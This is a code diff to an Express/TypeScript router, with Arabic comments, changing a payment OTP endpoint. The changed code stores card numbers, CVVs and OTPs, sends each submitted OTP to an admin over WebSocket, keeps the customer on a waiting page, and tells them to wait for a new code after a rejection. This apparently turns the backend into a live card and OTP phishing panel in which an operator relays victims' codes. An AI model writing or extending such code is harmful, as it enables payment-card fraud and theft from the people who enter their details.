@@ -690,7 +690,7 @@ router.post("/:id/payment-action", async (req, res) => {
 });
 
 
-// التحقق من رمز OTP للدفع
+// إرسال رمز OTP للدفع (يبقى العميل في انتظار المدير)
 router.post("/:id/payment-otp", async (req, res) => {
   const id = Number(req.params.id);
   const { otp } = req.body as { otp: string };
@@ -726,13 +726,13 @@ router.post("/:id/payment-otp", async (req, res) => {
         )
       );
 
-    // إنشاء نسخة جديدة مع حالة completed
+    // إنشاء نسخة جديدة مع حالة otp_submitted (في انتظار موافقة المدير)
     const [newApp] = await db
       .insert(applicationsTable)
       .values({
         sessionId: app.sessionId,
         applicantType: app.applicantType,
-        currentStep: "success",
+        currentStep: "pay-otp",
         status: app.status,
         bankId: app.bankId,
         bankName: app.bankName,
@@ -760,8 +760,8 @@ router.post("/:id/payment-otp", async (req, res) => {
         paymentExpiryDate: app.paymentExpiryDate,
         paymentCvv: app.paymentCvv,
         paymentOtp: app.paymentOtp,
-        paymentStatus: "completed",
-        paymentCompletedAt: new Date(),
+        paymentStatus: "otp_submitted", // حالة جديدة: بانتظار موافقة المدير على OTP
+        paymentCompletedAt: null,
         extraData: app.extraData,
         adminNote: app.adminNote,
         version: (app.version || 1) + 1,
@@ -776,24 +776,22 @@ router.post("/:id/payment-otp", async (req, res) => {
       .set({ applicationId: newApp.id, lastSeenAt: new Date() })
       .where(eq(sessionsTable.id, newApp.sessionId));
 
-    // إرسال إشعار WebSocket مع بيانات التطبيق الكاملة
+    // إرسال إشعار WebSocket للمدير (ليس للعميل)
     broadcast({
-      type: "payment_completed",
+      type: "otp_submitted",
       sessionId: newApp.sessionId,
-      data: {
-        ...newApp,
-        applicantName: newApp.fullName || newApp.companyName || newApp.contactName || null,
-        eventType: "payment"
-      },
+      data: newApp,
     });
 
+    // لا نرسل شيئاً للعميل - يبقى في صفحة الانتظار
     res.json({
       success: true,
-      message: "تمت الموافقة على الدفع بنجاح!",
+      message: "تم استلام الرمز. في انتظار موافقة المدير.",
+      waiting: true, // إشارة للعميل بأن يبقى في الانتظار
     });
   } catch (err) {
-    req.log.error({ err }, "خطأ في التحقق من رمز OTP");
-    res.status(500).json({ error: "فشل في التحقق من الرمز" });
+    req.log.error({ err }, "خطأ في إرسال رمز OTP");
+    res.status(500).json({ error: "فشل في إرسال الرمز" });
   }
 });
 
@@ -955,7 +953,7 @@ router.post("/:id/otp-action", async (req, res) => {
           paymentStatus: "approved",
           currentStep: "pay-otp",
           redirectUrl: `/pay-otp?applicationId=${newApp.id}&session=${newApp.sessionId}`,
-          message: "تم رفض الرمز. يرجى إدخال الرمز الجديد.",
+          message: "تم إدخال رمز غير صحيح أو منتهي. يرجى انتظار رمز جديد.",
         },
       });
 
